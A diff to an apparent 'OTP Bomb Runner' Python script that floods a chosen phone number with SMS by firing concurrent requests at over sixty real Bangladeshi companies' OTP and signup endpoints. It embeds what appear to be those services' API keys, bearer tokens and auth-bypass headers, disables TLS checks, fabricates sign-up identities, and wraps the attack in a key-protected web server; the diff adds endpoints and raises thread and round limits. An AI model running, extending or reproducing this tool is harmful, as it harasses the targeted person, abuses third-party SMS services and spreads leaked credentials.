@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
-"""OTP Bomb Runner V2 - Python (zero deps, 30 workers, ~8s/round)
-   Added: + → variant for buggy APIs per round.
-   Usage: python runner-v2.py 017XXXXXXXX 5
-      or: python runner-v2.py --server [--port 8080]
+"""OTP Bomb Runner - Python (zero deps, 30 workers, ~8s/round)
+   Usage: python runner.py 017XXXXXXXX 5
+      or: python runner.py --server [--port 8080]
 """
 
 import sys, os, json, random, hashlib, time, ssl, string, threading
@@ -28,37 +27,9 @@ CTX = ssl.create_default_context()
 CTX.check_hostname = False
 CTX.verify_mode = ssl.CERT_NONE
 
-# APIs that need + / - variants each round
-BUGGY_APIS = {
-    'aarong', 'bdjob', 'bengalmeat', 'chaldal', 'chorcha', 'esquire',
-    'ghorerbazar', 'kabbik', 'kireibd', 'osudpotro', 'pbazaar',
-    'propertywala', 'quizgiri', 'trucklagbe', 'unimart'
-}
-
 def rn(): return random.choice(FN), random.choice(LN)
 def re(): return f"{''.join(random.choice(EC) for _ in range(random.randint(6,10)))}@{random.choice(DM)}"
 def rp(): return ''.join(random.choice(PC) for _ in range(random.randint(8,12)))
-
-def generate_variant(raw_phone, gen_index):
-    """Generate + at position gen_index (0..N-1), then - at position (N..2N-1)
-       gen_index 0 → +017.., gen_index 1 → 0+17.., ... , gen_index N → -017.. , etc."""
-    # clean to digits only
-    clean = raw_phone.strip().removeprefix('+880').lstrip('+').replace('-','').replace(' ','')
-    n = len(clean)
-    if gen_index < n + 1:
-        # + sign variants
-        if gen_index == 0:
-            return '+' + clean
-        return clean[:gen_index] + '+' + clean[gen_index:]
-    else:
-        # - sign variants
-        d = gen_index - (n + 1)
-        if d >= n + 1:
-            # wraparound (unlikely needed but safe)
-            d = d % (n + 1)
-        if d == 0:
-            return '-' + clean
-        return clean[:d] + '-' + clean[d:]
 
 def fmt_phone(raw):
     raw = raw.strip()
@@ -95,6 +66,7 @@ def preflight(url, extra_hdrs=None):
         return ''
 
 def preflight_raw(url, extra_hdrs=None):
+    """Returns (body, headers_dict) for cookie/token extraction"""
     h = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest'}
     if extra_hdrs:
         h.update(extra_hdrs)
@@ -106,20 +78,15 @@ def preflight_raw(url, extra_hdrs=None):
     except:
         return '', {}
 
-def build_request(api, phone, variant=None):
+def build_request(api, phone):
     fN, lN = rn()
     fun = f"{fN} {lN}"
     em = re()
     pw = rp()
-    # Use variant for buggy APIs
-    if api in BUGGY_APIS and variant:
-        vp = variant
-    else:
-        vp = phone
-    pr = vp['raw']
-    p8 = vp['p880']
-    pp = vp['plus']
-    pd = vp['dash']
+    pr = phone['raw']
+    p8 = phone['p880']
+    pp = phone['plus']
+    pd = phone['dash']
 
     url = ''; body = ''; method = 'POST'
     h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA}
@@ -179,7 +146,7 @@ def build_request(api, phone, variant=None):
             url = 'https://www.robi.com.bd/en/auth/login:01882873117:01788874786'
             body = json.dumps([{"msisdn": pr}])
             h = {'Content-Type': 'text/plain;charset=UTF-8', 'Accept': 'text/x-component',
-                 'User-Agent': UA, 'Origin': 'https://www.bliali.com.bd',
+                 'User-Agent': UA, 'Origin': 'https://www.robi.com.bd',
                  'next-action': '7f085f18ad8ebc8d49e2e00713b7e5568e836b5483'}
         elif api == 'bohubrihi':
             url = 'https://bb-api.bohubrihi.com/public/activity/otp'
@@ -187,12 +154,12 @@ def build_request(api, phone, variant=None):
         elif api == 'sheba':
             url = 'https://accountkit.sheba.xyz/api/shoot-otp'
             body = json.dumps({"mobile": pp, "app_id": "8329815A6D1AE6DD",
-                              "api_token": "d1op1o9xvVPShfr2k3JNzUt4RamE84vOrYgX89bCPFKhpWuzitVVadas4uMpgM"})
+                              "api_token": "d1op1o9xvVPShfr2k3JNzUt4RamE84vOrYgX89bCPFKhpWuzitVVAD4uMpgM"})
         elif api == 'trucklagbe':
             url = 'https://tethys.trucklagbe.com/tl_gateway/tl_login/131/loginWithPhoneNo'
             body = json.dumps({"userType": "shipper", "phoneNo": pr})
-            h['X-Bypass-Auth-Key'] = 'b6253a42-50be-444a-8017-cd1319f4e79b-b280108f-3bdc-4ea7-964e-07e78cb5c90'
-            h['deviceId'] = '103.66.1684.2011784186323086'
+            h['X-Bypass-Auth-Key'] = 'b6253a42-50bf-444a-8017-cd1319f4e79b-b280108f-3bdc-4ea7-964e-07e841cb5c90'
+            h['deviceId'] = '103.66.168.2011784186323086'
             h['source'] = 'website'
         elif api == 'osudpotro':
             url = 'https://api.osudpotro.com/api/v1/users/send_otp'
@@ -210,15 +177,15 @@ def build_request(api, phone, variant=None):
             h = {'User-Agent': UA, 'Accept': 'application/json', 'x-requested-with': 'com.khaasfood'}
         elif api == 'cookups':
             try:
-                http_post('https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U7Y4C216iFzFg',
+                http_post('https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U6Y4C216iFzFg',
                           json.dumps({"Action": ["UpdateClientPlatform", "Web"],
                                       "Constructor": ["NewFromId", ["SessionId", "c7208e9f-fd10-4ed5-98e0-2db5ea217316"]]}),
                           {'Content-Type': 'application/json', 'User-Agent': UA}, 4)
             except:
                 pass
-            url = 'https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n54gxxD91U6Y4C216iFzFg'
+            url = 'https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U6Y4C216iFzFg'
             body = json.dumps({"Action": ["GenerateOtp", {"Value_": ["BdMobileNumber", pp]}],
-                              "Constructor": ["NewFromId", {"SessionId": "c7208e9f-fd10-4ed5-98b-2db5ea217316"}]})
+                              "Constructor": ["NewFromId", {"SessionId": "c7208e9f-fd10-4ed5-98e0-2db5ea217316"}]})
             h['Origin'] = 'https://cookups.app'
         elif api == 'arogga':
             url = 'https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=149.0.7827.160&os=Android&osv=11'
@@ -226,7 +193,7 @@ def build_request(api, phone, variant=None):
             h = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Accept': '*/*',
                  'User-Agent': UA, 'Origin': 'https://www.arogga.com'}
         elif api == 'chaldal':
-            url = f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=ae1b1e1d&phoneNumber={urlquote(pp)}&retryAttempt=0"
+            url = f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=ae1b1e1c&phoneNumber={urlquote(pp)}&retryAttempt=0"
             body = '{}'
             h['x-egg-clientapp'] = 'Omelette'
             h['x-egg-platform'] = 'Browser'
@@ -243,8 +210,8 @@ def build_request(api, phone, variant=None):
             url = 'https://myadmin.unimart.online/api/v1/auth/sign-up'
             body = json.dumps({"phone": pp, "dob": dob, "gender": "Male", "email": em, "password": pw, "name": fN})
             h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': '*/*',
-                 'User-Agent': UA, 'authorization': 'null', 'store-id': '1',
-                 'x-localization': 'en', 'zone-id': '[1]', 'module-id': '1', 'area-id': '1'}
+                 'User-Agent': UA, 'authorization': 'null', 'storeid': '1',
+                 'x-localization': 'en', 'zoneid': '[1]', 'moduleid': '1', 'areaid': '1'}
         elif api == 'cholpori':
             url = 'https://www.cholpori.com/api/Auth/Register'
             body = json.dumps({"firstName": fN, "lastName": lN, "phoneNumber": pr, "role": "12"})
@@ -292,15 +259,15 @@ def build_request(api, phone, variant=None):
         elif api == 'cinespot':
             preflight('https://cinespot.mobi/otp/sent')
             url = 'https://cinespot.mobi/otp/sent'
-            body = f"_ten=x&mobile_number={pr}"
+            body = f"_token=x&mobile_number={pr}"
             h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
-                 'Origin': 'https://cinespot.mobi', 'Referer': 'https://cinespot.mobi/sent'}
+                 'Origin': 'https://cinespot.mobi', 'Referer': 'https://cinespot.mobi/otp/sent'}
         elif api == 'edutubebd':
             preflight(f'https://accounts.edutubebd.com/register/otp?phone={pr}&token=x',
                       {'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                        'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0'})
             url = 'https://accounts.edutubebd.com/register/verify-phone'
-            body = json.dumps({"phone": pr, "token": "placeholder_secret"})
+            body = json.dumps({"phone": pr, "token": "placeholder_token"})
             h.update({'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                       'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0',
                       'Origin': 'https://accounts.edutubebd.com'})
@@ -311,7 +278,7 @@ def build_request(api, phone, variant=None):
             h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
                  'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://propertywala.com',
                  'Cookie': 'locationId=20'}
-        elif api == 'bengalmeat_otp':
+        elif api == 'bengalmeat_otp':  # DUPLICATE: same as bengalmeat above
             url = 'https://api.bengalmeat.com/auth/otp-login'
             body = json.dumps({"phone": pr})
         elif api == 'perfumeshop':
@@ -324,7 +291,7 @@ def build_request(api, phone, variant=None):
         elif api == 'bookhouse':
             preflight('https://bookhouse.com.bd/register')
             url = 'https://bookhouse.com.bd/register'
-            body = urllib.parse.urlencode({'_token': 'x', 'name': fN, 'email': em, 'mobile_no': pr,
+            body = urllib.parse.urlencode({'_token': 'x', 'name': fun, 'email': em, 'mobile_no': pr,
                                            'password': pw, 'password_confirmation': pw, 'referral_code': ''})
             h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                  'Origin': 'https://bookhouse.com.bd', 'Referer': 'https://bookhouse.com.bd/register'}
@@ -332,9 +299,9 @@ def build_request(api, phone, variant=None):
             preflight('https://watchzonebd.com/customer/register')
             url = 'https://watchzonebd.com/customer/register'
             body = urllib.parse.urlencode({'_token': 'x', 'loginDetail': '', 'name': fN, 'phone': pr,
-                                           'email': em, 'address': 'Dhaka, BD', 'password': pw, 'password_confirmation': pw})
+                                           'email': em, 'address': 'Dhaka', 'password': pw, 'password_confirmation': pw})
             h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
-                 'Origin': 'https://watchzonebd.com', 'Referer': 'https://watchzonebd.com/register'}
+                 'Origin': 'https://watchzonebd.com', 'Referer': 'https://watchzonebd.com/customer/register'}
         elif api == 'telicall':
             url = 'https://api.telicall.com/banner/phone-verification'
             body = '{}'
@@ -342,11 +309,11 @@ def build_request(api, phone, variant=None):
                       'x-app-version': '1.8.0', 'x-client-device-id': '0b346f54639f3b9c',
                       'x-lang': 'en', 'x-os': 'android', 'x-os-version': '11',
                       'x-req-timestamp': str(int(time.time() * 1000)),
-                      'x-token': 'g4rqp88VdKknaqJOmR9KiKKiN-dAYFanCZOikzOWjD4lZI299dQoqiq6zhmMEp_S',
-                      'x-req-signature': 'Ca7sS+XcB6Cr7x93ayiypkdMTJZFad4EBEqOXef86jk='})
+                      'x-token': 'g4rqp88VdKknaqJOmR9KiKChN-dAYFanCZOikzOWjD4lZI299dQoqiq6zhmMEp_S',
+                      'x-req-signature': 'Ca7sS+XcB6Cr7x93ayiypkdMTJZFad4EBEqOXexwcjk='})
         elif api == 'bdjob':
-            url = 'https://mybdjobs.bdjobs.com/r_OTPVerifyAcconut.asp'
-            body = 'tid=1lE3lHBC6767936i6XAOHnW&cat_Type=0&isTTC=false&hqs=&hIsFromFair=False&hnameType=mobile'
+            url = 'https://mybdjobs.bdjobs.com/r_OtpVerifyAcconut.asp'
+            body = 'tid=1lE3l3C6767936i6XAOHnW&cat_Type=0&isTTC=false&hqs=&hIsFromFair=False&hUsernameType=mobile'
             h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                  'Origin': 'https://mybdjobs.bdjobs.com'}
         elif api == 'chorcha':
@@ -366,9 +333,9 @@ def build_request(api, phone, variant=None):
             body = json.dumps({"countryCode": "BD", "mobileNumber": pp, "mobileNumberOrEmail": pp, "userType": "USER"})
             h = {'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'mobile-android',
                  'devicename': 'Infinix_Infinix X665B', 'devicetype': 'ANDROID',
-                 'deviceid': 'Infinix-X665B-e1f7baf3770aaa82', 'apptype': '2.1.61'}
+                 'deviceid': 'Infinix-X665B-e1f7baf3770aaa82', 'appversion': '2.1.61'}
         elif api == 'pbazaar':
-            preflight(f'https://www.pbazaar.com/en/Registration/MobileNumber?ResultCode=0&MobileNumber={pr}&activation-code=Send+Code')
+            preflight(f'https://www.pbazaar.com/en/Registration/MobileNumber?ResultCode=0&MobileNumber={pr}&send-code=Send+Code')
             url = f'https://www.pbazaar.com/en/Registration/MobileNumber?ResultCode=0&MobileNumber={pr}&send-code=Send+Code'
             body = ''
             method = 'GET'
@@ -376,7 +343,7 @@ def build_request(api, phone, variant=None):
         elif api == 'iscreen':
             url = 'https://api.rockstreamer.com/otp/api/v1/phone/otp'
             body = json.dumps({"phone_number": pp})
-            h['authorization'] = 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE5NzIzMzg1IiwicHJvdmlkZXJfaWQiOiIxNzg0MjM3MTgyNDE2LUwwb3MzTVMzZDFWTmtrQVNDT1BqMUE3NmV2T1RUMEQ3NDRJR1ZWMzVmSUc3Z093aERGY2ZQQXN0NWQ2Wjk0bW8iLCJyb2xlIjo0LCJ1c2VybmFtZSI6Im5tOVhSdSIsInBsYXRmb3JtIjoiaXNjcmVlbiIsInBhcnRuZXIiOm51bGwsInN1YnNjcmliZSI6ZmFsc2UsInBhY2thZ2VJbmZvIjpudWxsLCJpc1RWT0QiOmZhbHNlLCJ0dm9kRXhwaXJlRGF0ZSI6IjE5NzAtMDEtMDEiLCJpYXQiOjE3ODQyMzcxODIsImV4cCI6MTc4bMzMyMzU4Mn0.kIMtAvc0kfQpUZXiaLknKo7BKUtTH9TE126hPMoQ6wSXbk5npbcEBJbT94_MYVADE97-D4DtWQmFDur8MD4ILz6ZQeallyfOjNQ7_KEQhQQQjM3CHbreEgzc9SohqoFOTGt_VpBa3OAS0Ph8WDAPfNLtlO8zoUGx0CaqLDRZtXecHzwqsF92icXiveSECemAGnXeKCr074CRUSWAsUMAeXSjT4LVGN9unjk5cx6soWhq6NG_nz9n-TLUJg4wnwwzv1cwtMPI9hoYF89KXb0KVdgdNH_5ryhj09jGDDZahNjtw5d99vcm-RCiTPhNUed9Kd3LeexEz85gFo7Yb4orHTxdUb6NMTOAHAZwPez6_ow8OC632KuJYrwefz2J9mj7gDnuw_HoI9mVnUZFUJd-iPio8G98DcOH3LvtB5onoUFGJqHsc0EPzOb-APUOjJpQXdrY95rM_PXAG_USATEHvxWTssoX_WhcPSazAxcFr25BTWRQltwlsALoccWfAOCe7th4sVC93Fwo3bEkzVcySN-bX2GDoRn4hw_HeRJvX8XzXLdiKYLRgmTin7FAVE0VtgcGGXeHkL9oze5I8vRyqDQMCK2ZJl57RXQ6MpBqUWMi3gd-nqS522RYqyaQ_6Q-t9o2YWNgihSDDiFJOqE-jbPyDjkrXnTtrADemyuO-YMxY4o41LmAM'
+            h['authorization'] = 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE5NzIzMzg1IiwicHJvdmlkZXJfaWQiOiIxNzg0MjM3MTgyNDE2LUwwb3MzTVMzZDFWTmtrQVNDT1BqMUE3NmV2T1RUMEQ3NDRJR1ZWMzVmSUc3Z093aERGY2ZQQXN0NWQ2Wjk0bW8iLCJyb2xlIjo0LCJ1c2VybmFtZSI6Im5tOVhSdSIsInBsYXRmb3JtIjoiaXNjcmVlbiIsInBhcnRuZXIiOm51bGwsInN1YnNjcmliZSI6ZmFsc2UsInBhY2thZ2VJbmZvIjpudWxsLCJpc1RWT0QiOmZhbHNlLCJ0dm9kRXhwaXJlRGF0ZSI6IjE5NzAtMDEtMDEiLCJpYXQiOjE3ODQyMzcxODIsImV4cCI6MTc4NDMyMzU4Mn0.kIMtAvc0kfQpUZxaLknKo7BKUtTHC7TE126hPMoQ6wSXbk5npbcEBJbT94_MYVAD997-D4DtWQmFDur8MD4ILz6ZAeagyfOjNQ7_KEQhQQQkM3CHbreEgzc9SohqoFOTGt_VpBa3OAS0Ph8WDAPfNLtlO8zoUGx0CaqLDRZtXecHzwqsF83icXiveSECemAJmXeKCr074CRUSWAsUMAeXSjT4LVGN9unjk5cx6soWha6NG_nz9n-TL0wf64wnwwzv1cwtMPI8hoYF89KXb0VdgdNH_5ryhj09jGDZahNjtw5d99vcm-RCiT1NUed9Kd3LeexEz85g1o7Yb4oqHTxdUb6NMTOAHAZwPez6_ow8OC632KuEYrwedz2J9mj7gDnuw_H-J8mJnUZFD-kPiH78G98Dc9VvtBKonCvGJbFscOPzbO-AzUOjJp9arjY95rM_PXAG_USRTHvxWTssoX_WhcPSazAxcFr25BTWRQltwesAHceWfAOCc7th4sVC93Fwo3bEkzVv3SN-bXGDoAn4dw_seRlvT8XzTLKiTTLRgmTIN7FAVE0VMecGG7eFkLooze5I8vRyqDQM6CKaZJl56RXQ6MpBqkWBc3gdSlnO522wYqPaQ_6Q-194r2W1Ig9hhDiFJOQbJ-jbPyDgtkXnPtrODemyuO-YIcYo41LmAM'
         elif api == 'rabbithole':
             ct = int(time.time())
             hs = hashlib.sha256(f"{ct}rabbithole_secret".encode()).hexdigest()
@@ -392,7 +359,7 @@ def build_request(api, phone, variant=None):
         elif api == 'jatri':
             url = 'https://api.retail.jatri.co/auth/api/v1/send-otp'
             body = json.dumps({"phone": pr, "purpose": "USER_LOGIN", "deviceType": "WEB", "cloudFlareToken": "placeholder"})
-            h['token'] = 'cSkjXjjg3LC3KudSPgt2V9gjKW0thNW5Gk26fOKH1AHplnrhVyazTCo0DfVyJPFV'
+            h['token'] = 'cSkjXjjg3LC3KudSPgt2V9gjKK0thNW5Gk26nhHJpgQr2FtjDtgptCNLSnneTG0t'
             h['x-os'] = 'Android'
             h['x-browser'] = 'Chrome'
             h['x-browser-version'] = '150'
@@ -401,7 +368,7 @@ def build_request(api, phone, variant=None):
             url = 'https://bk.shajgoj.com/api/customers/send-otp'
             body = json.dumps({"recaptcha": "placeholder", "phone": p8})
         elif api == 'iqralive':
-            url = f'https://apibeta.iqra-live.com/api/v2/send-otp/{pr}'
+            url = f'https://apibeta.iqra-live.com/api/v2/sent-otp/{pr}'
             body = ''
             method = 'GET'
         elif api == 'quizgiri':
@@ -422,33 +389,90 @@ def build_request(api, phone, variant=None):
                  'App-Agent': 'ride/android/537', 'Android-OS': '11'}
         elif api == 'garibook':
             url = 'https://api.garibookadmin.com/api/v4/user/login'
-            body = json.dumps({"mobile": pp, "gb_code": "IKiyBy55yYkaF8Q"})
+            body = json.dumps({"mobile": pp, "gb_code": "IKiyBy55yYkaF8U"})
             h = {'Content-Type': 'application/json', 'User-Agent': 'Dart/3.12 (dart:io)',
                  'Accept': 'application/json', 'authorization': 'Bearer', 'x-requested-with': 'XMLHttpRequest'}
         elif api == 'shadhin':
             url = 'https://connect.shadhinmusic.com/v1/api/otp/send'
-            body = json.dumps({"action": "Forget", "msisdn": p8, "serviceName": "Shadhin Music", "user": "sh@dhjnOTP"})
+            body = json.dumps({"action": "Forget", "msisdn": p8, "serviceName": "Shadhin Music", "user": "sh@dHinOTP"})
             h = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'ShadhinMusic v4.4.2'}
+        elif api == 'suzuki':
+            url = 'https://suzuki.com.bd/signup'
+            body = json.dumps([{"firstName": fN, "lastName": lN, "countryCode": "BD", "phone": pr, "email": em, "password": pw, "confirmPassword": pw, "otp": ""}, "initial"])
+            h = {'Content-Type': 'text/plain;charset=UTF-8', 'Accept': 'text/x-component', 'User-Agent': UA, 'Origin': 'https://suzuki.com.bd', 'Next-Action': 'b45aa2700649f9fa8fb8befec1519c7f2b4c2192'}
+        elif api == 'biddabari':
+            url = 'https://biddabari.com/user-register'
+            body = f"_token=x&name={urlquote(fun)}&mobile={pr}&password={pw}&password_confirmation={pw}"
+            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://biddabari.com', 'Referer': 'https://biddabari.com/register-page'}
+        elif api == 'karobar':
+            url = 'https://mybackend.karobarapp.com/api/v3/oauth/otp-request/'
+            body = json.dumps({"phone_number": pr, "country": "bd"})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://my.karbarapp.com', 'Referer': 'https://my.karbarapp.com/'}
+        elif api == 'packly':
+            url = 'https://admin.shop.packly.com/api/v1/ecommerce/send-otp'
+            body = json.dumps({"phone": pr})
+            h = {'Content-Type': 'application/json', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://www.packly.com', 'X-Platform': 'web', 'X-App-Version': '1.0.0', 'X-Build-Number': '1.0.0'}
+        elif api == 'carrybee_verify':
+            url = f'https://merchant.carrybee.com/register/verification/{p8}?otpPrefix=WFA'
+            body = ''
+            method = 'GET'
+            h = {'User-Agent': UA, 'Accept': '*/*', 'Referer': 'https://merchant.carrybee.com/register'}
+        elif api == 'carrybee_register':
+            url = 'https://api-merchant.carrybee.com/api/v2/merchant/register'
+            body = json.dumps({"name": fN, "phone_number": pp, "business_name": f"{fN} Business"})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json', 'User-Agent': UA, 'Origin': 'https://merchant.carrybee.com', 'Referer': 'https://merchant.carrybee.com/'}
+        elif api == 'eziclick':
+            url = 'https://eziclick.com/web-api/api/register/check-phone'
+            body = json.dumps({"phone": pr})
+            h = {'Content-Type': 'application/json', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://eziclick.com', 'Referer': 'https://eziclick.com/shop?login=1'}
+        elif api == 'livemcq':
+            url = 'https://livemcq.com/web-otp-send/'
+            body = f"phone_number={pr}"
+            h = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*', 'User-Agent': UA, 'Origin': 'https://livemcq.com', 'Referer': 'https://livemcq.com/login/', 'X-CSRFToken': 'x', 'X-Requested-With': 'XMLHttpRequest'}
+        elif api == 'timezonebd':
+            url = 'https://backend.timezonebd.com/api/v1/user/otp-login'
+            body = json.dumps({"phone": pr})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://timezonebd.com', 'Referer': 'https://timezonebd.com/', 'Authorization': ''}
+        elif api == 'shaddho':
+            url = 'https://shaddho.com.bd/register'
+            body = f"_token=x&name={urlquote(fun)}&phone={pr}&country_code=88&email={em}&password={pw}&password_confirmation={pw}&checkbox_example_1=on"
+            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://shaddho.com.bd', 'Referer': 'https://shaddho.com.bd/users/registration'}
+        elif api == 'amarbay':
+            url = 'https://backend.amarbay.com/user/find_user_by_phone/'
+            body = json.dumps({"phone_number": pr})
+            h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, 'Origin': 'https://amarbay.com', 'Referer': 'https://amarbay.com/'}
+        elif api == 'udvash':
+            url = f'https://online.udvash-unmesh.com/Registration?nickName={urllib.urlencode(fN)}&mobileNumber={p8}'
+            body = ''
+            method = 'GET'
+            h = {'User-Agent': UA, 'Accept': 'text/html', 'Origin': 'https://online.udvash-unmesh.com', 'Referer': 'https://online.udvash-unmesh.com/'}
     except Exception as e:
         return None
 
     return {'url': url, 'body': body, 'headers': h, 'method': method}
 
-# Full list of 52 APIs
+# Full list of 64 APIs
 APIS = [
-    'binge','admissionaker','medico','chardike','apex4u','ghoori','mygp','shikho','redx',
+    'binge','admissiontaker','medico','chardike','apex4u','ghoori','mygp','shikho','redx',
     'fteducation','banglalink','robi','bohubrihi','sheba','trucklagbe','osudpotro',
     'banglamed','cookups','arogga','chaldal','shohoz','bengalmeat','unimart',
     'cholpori','deeptoplay','paperfly','aarong','esquire','htmind','kireibd','kabbik',
     'cinespot','edutubebd','propertywala','bengalmeat_otp','perfumeshop','bookhouse',
     'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
-    'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao','garibook','shadhin'
+    'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao','garibook','shadhin','khaasfood',
+    'suzuki','biddabari','karobar','packly','carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho','udvash','amarbay'
 ]
 
-MAX_WORKERS = 30
+MAX_WORKERS = 50
 
-def call_api(api, phone, variant=None):
-    req = build_request(api, phone, variant)
+try:
+    from flask import Flask, request, jsonify
+    HAS_FLASK = True
+except ImportError:
+    HAS_FLASK = False
+
+def call_api(api, phone):
+    req = build_request(api, phone)
     if not req:
         return {'api': api, 'status': 0, 'time_ms': 0, 'error': 'build_failed'}
     t0 = time.time()
@@ -465,13 +489,15 @@ def call_api(api, phone, variant=None):
     elapsed = round((time.time() - t0) * 1000)
     return {'api': api, 'status': status, 'time_ms': elapsed}
 
-def fire_round(phone, variant=None):
+
+def fire_round(phone):
     results = []
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
-        futures = {pool.submit(call_api, api, phone, variant): api for api in APIS}
+        futures = {pool.submit(call_api, api, phone): api for api in APIS}
         for f in as_completed(futures):
             results.append(f.result())
     return results
+
 
 def run(phone_str, rounds):
     phone = fmt_phone(phone_str)
@@ -479,11 +505,7 @@ def run(phone_str, rounds):
     all_results = {}
 
     for r in range(1, rounds + 1):
-        # Generate variant for round r (0-indexed = r-1)
-        v_raw = generate_variant(phone_str, r - 1)
-        variant = fmt_phone(v_raw) if v_raw else None
-
-        results = fire_round(phone, variant)
+        results = fire_round(phone)
         all_results[f"round_{r}"] = {
             r['api']: {'status': r['status'], 'time_ms': r['time_ms']}
             for r in sorted(results, key=lambda x: x['api'])
@@ -503,14 +525,16 @@ def run(phone_str, rounds):
         'results': all_results
     }
 
+
 def start_server(port=8080):
     SECRET = os.environ.get('API_SECRET', 'SuSHiLx2024SMS')
 
     class Handler(BaseHTTPRequestHandler):
         def do_GET(self):
+            q = urlparse(urlparse(self.path).path + '?' + (urlparse(self.path).query if urlparse(self.path).query else '')).query
             q = parse_qs(urlparse(self.path).query)
             phone = q.get('phone', [''])[0]
-            rounds = min(max(int(q.get('rounds', ['1'])[0]), 1), 50)
+            rounds = min(max(int(q.get('rounds', ['1'])[0]), 1), 100)
             key = q.get('key', [''])[0]
 
             if key != SECRET:
@@ -533,25 +557,25 @@ def start_server(port=8080):
                     'rounds': rounds,
                     'total_apis': len(APIS),
                     'total_hits': len(APIS) * rounds,
-                    'msg': f'Robort started! {len(APIS) * rounds} SMS pathano hocch.'
+                    'msg': f'Runner started! {len(APIS) * rounds} SMS pathano hocche.'
                 })
                 self.wfile.write(resp.encode())
             else:
                 self.send_response(400)
                 self.end_headers()
-                self.wfile.write(b'Invalid phone. Use: /?phone=017XXXXXXXX&rounds=5&key=SECRET')
+                self.wfile.write(b'Invalid phone. Usage: /?phone=017XXXXXXXX&rounds=5&key=SECRET')
 
         def log_message(self, format, *args):
             pass
 
     print(f"""
-OTP BOMB RUNNER V2 (Original + Variant)
-========================================
-Server: http://0.0.0.0:{port}
-Usage:  http://YOUR_IP:{port}/?phone=017XXXX&rounds=5
+OTP RUNNER (Python)
+=======================
+Built-in Server: http://0.0.0.0:{port}
+Flask Server:    http://0.0.0.0:{port+1}
+Usage:  http://YOUR_IP:{port}/?phone=017XXXXXXXX&rounds=5
 APIs:   {len(APIS)} total
 Workers: {MAX_WORKERS} threads
-Buggy APIs (variant): {len(BUGGY_APIS)}
 """)
     server = ThreadingHTTPServer(('0.0.0.0', port), Handler)
     try:
@@ -559,8 +583,54 @@ Buggy APIs (variant): {len(BUGGY_APIS)}
     except KeyboardInterrupt:
         print("\nServer stopped.")
 
+
+def start_flask(port=8080):
+    SECRET = os.environ.get('API_SECRET', 'SuSHiLx2024SMS')
+    app = Flask(__name__)
+
+    @app.route('/')
+    def fire():
+        phone = request.args.get('phone', '')
+        rounds = min(max(int(request.args.get('rounds', 1)), 1), 100)
+        key = request.args.get('key', '')
+
+        if key != SECRET:
+            return jsonify({'error': 'Wrong key'}), 403
+
+        if not phone or len(phone) < 11:
+            return jsonify({'error': 'Invalid phone'}), 400
+
+        def fire_bg():
+            run(phone, rounds)
+        threading.Thread(target=fire_bg, daemon=True).start()
+
+        return jsonify({
+            'status': 'started',
+            'phone': phone,
+            'rounds': rounds,
+            'total_apis': len(APIS),
+            'total_hits': len(APIS) * rounds,
+            'msg': f'Started! {len(APIS) * rounds} SMS'
+        })
+
+    print(f"\n  Flask Server: http://0.0.0.0:{port}")
+    print(f"  APIs: {len(APIS)} | Workers: {MAX_WORKERS}")
+    print(f"  Secret: {SECRET}\n")
+
+    app.run(host='0.0.0.0', port=port, threaded=True)
+
+
 if __name__ == '__main__':
-    if '--server' in sys.argv or '-s' in sys.argv:
+    if '--flask' in sys.argv:
+        p = int(os.environ.get('PORT', 8080))
+        for i, a in enumerate(sys.argv):
+            if a == '--port' and i + 1 < len(sys.argv):
+                p = int(sys.argv[i + 1])
+        if HAS_FLASK:
+            start_flask(p)
+        else:
+            print("Flask not installed! Run: pip install flask")
+    elif '--server' in sys.argv or '-s' in sys.argv:
         p = int(os.environ.get('PORT', 8080))
         for i, a in enumerate(sys.argv):
             if a == '--port' and i + 1 < len(sys.argv):
@@ -573,9 +643,11 @@ if __name__ == '__main__':
